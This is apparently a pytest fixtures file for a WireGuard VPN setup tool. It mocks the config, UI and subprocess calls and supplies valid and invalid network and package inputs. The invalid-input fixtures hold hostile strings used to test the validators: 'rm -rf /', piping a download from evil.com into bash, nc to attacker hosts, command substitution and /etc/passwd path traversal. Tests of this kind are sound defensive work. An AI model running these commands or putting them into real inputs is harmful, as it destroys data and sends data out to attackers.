"""Pytest configuration and fixtures for VPNHD tests."""

import pytest
from pathlib import Path
import tempfile
import json
from unittest.mock import MagicMock, Mock
from dataclasses import dataclass


@pytest.fixture
def temp_dir():
    """Provide a temporary directory for test files."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def mock_config(temp_dir):
    """Provide a ConfigManager with temporary config file."""
    from vpnhd.config.manager import ConfigManager

    config_file = temp_dir / "config.json"
    config = ConfigManager(config_path=config_file)

    # Initialize with minimal config
    config.data = {"version": "1.0.0", "phases": {}, "server": {}, "network": {}, "clients": {}}
    config.save()

    return config


@pytest.fixture
def mock_display():
    """Provide a mocked Display instance."""
    from vpnhd.ui.display import Display

    display = MagicMock(spec=Display)
    return display


@pytest.fixture
def mock_prompts():
    """Provide a mocked Prompts instance."""
    from vpnhd.ui.prompts import Prompts

    prompts = MagicMock(spec=Prompts)
    prompts.confirm.return_value = True  # Default to yes
    return prompts


@pytest.fixture
def mock_execute_command(mocker):
    """Mock execute_command to prevent actual system calls."""
    from vpnhd.system.commands import CommandResult

    mock = mocker.patch("vpnhd.system.commands.execute_command")
    mock.return_value = CommandResult(
        exit_code=0, stdout="Mock output", stderr="", success=True, command="mock command"
    )

    return mock


@pytest.fixture
def sample_wireguard_key():
    """Provide a sample WireGuard key (format valid, but not real)."""
    return "cGFzc3dvcmQxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OQ=="


@pytest.fixture
def sample_config_data():
    """Provide sample configuration data for testing."""
    return {
        "version": "1.0.0",
        "phases": {
            "phase1_debian": {"completed": True},
            "phase2_wireguard_server": {"completed": False},
        },
        "server": {"hostname": "vpn-server", "lan_ip": "192.168.1.100", "interface": "eth0"},
        "network": {
            "lan": {"subnet": "192.168.1.0/24", "router_ip": "192.168.1.1"},
            "vpn": {"subnet": "10.66.66.0/24", "server_ip": "10.66.66.1"},
        },
        "clients": {},
    }


@pytest.fixture
def mock_subprocess_run(mocker):
    """Mock subprocess.run to prevent actual system calls."""
    mock = mocker.patch("subprocess.run")

    # Create a mock result
    result = Mock()
    result.returncode = 0
    result.stdout = "mock output"
    result.stderr = ""

    mock.return_value = result
    return mock


@pytest.fixture
def mock_logger(mocker):
    """Mock logger to capture log messages."""
    return mocker.patch("vpnhd.utils.logging.get_logger")


# Fixtures for network testing
@pytest.fixture
def valid_interface_names():
    """Provide valid interface names for testing."""
    return ["eth0", "wg0", "enp0s3", "wlan0", "br0", "tun0", "tap0", "veth0", "docker0"]


@pytest.fixture
def invalid_interface_names():
    """Provide invalid interface names for testing."""
    return [
        "",  # Empty
        "eth 0",  # Space
        "eth0; rm -rf /",  # Command injection attempt
        "eth0 && malware",  # Command injection
        "eth0|nc evil.com",  # Pipe injection
        "a" * 20,  # Too long (>15 chars)
        "../../../etc/passwd",  # Path traversal
        "eth0\n/bin/bash",  # Newline injection
        "eth0`whoami`",  # Command substitution
        "eth0$(whoami)",  # Command substitution
    ]


@pytest.fixture
def valid_package_names():
    """Provide valid package names for testing."""
    return [
        "wireguard-tools",
        "python3-pip",
        "openssh-server",
        "fail2ban",
        "ufw",
        "vim",
        "git",
        "curl",
        "python3.11",
        "lib64gcc-s1",
    ]


@pytest.fixture
def invalid_package_names():
    """Provide invalid package names for testing."""
    return [
        "",  # Empty
        "package name",  # Space
        "vim; curl evil.com/malware.sh | bash",  # Command injection
        "package && rm -rf /",  # Command injection
        "package|nc attacker.com 1234",  # Pipe injection
        "-package",  # Starts with hyphen
        ".package",  # Starts with period
        "pkg`whoami`",  # Command substitution
        "pkg$(ls)",  # Command substitution
        "a" * 300,  # Too long
    ]


@pytest.fixture
def valid_ip_addresses():
    """Provide valid IP addresses for testing."""
    return [
        "192.168.1.1",
        "10.0.0.1",
        "172.16.0.1",
        "8.8.8.8",
        "1.1.1.1",
        "127.0.0.1",
        "0.0.0.0",
        "255.255.255.255",
    ]


@pytest.fixture
def invalid_ip_addresses():
    """Provide invalid IP addresses for testing."""
    return [
        "",
        "999.999.999.999",
        "192.168.1",
        "192.168.1.1.1",
        "192.168.1.256",
        "192.168.-1.1",
        "not.an.ip.address",
        "192.168.1.1; rm -rf /",
    ]


@pytest.fixture
def valid_cidr_blocks():
    """Provide valid CIDR blocks for testing."""
    return [
        "10.66.66.0/24",
        "192.168.1.0/24",
        "172.16.0.0/16",
        "10.0.0.0/8",
        "192.168.1.1/32",
        "0.0.0.0/0",
    ]


@pytest.fixture
def invalid_cidr_blocks():
    """Provide invalid CIDR blocks for testing."""
    return [
        "",
        "10.0.0.0/99",
        "10.0.0.0/-1",
        "10.0.0.0",
        "not.a.cidr/24",
        "10.0.0.0/24; rm -rf /",
    ]


@pytest.fixture
def valid_netmasks():
    """Provide valid netmasks for testing."""
    return [
        "24",
        "16",
        "8",
        "32",
        "0",
        "255.255.255.0",
        "255.255.0.0",
        "255.0.0.0",
        "255.255.255.255",
        "0.0.0.0",
    ]


@pytest.fixture
def invalid_netmasks():
    """Provide invalid netmasks for testing."""
    return [
        "",
        "99",
        "-1",
        "255.255.0.255",  # Invalid pattern (gaps in binary)
        "255.255.255.1",  # Invalid pattern
        "not.a.netmask",
        "24; rm -rf /",
    ]
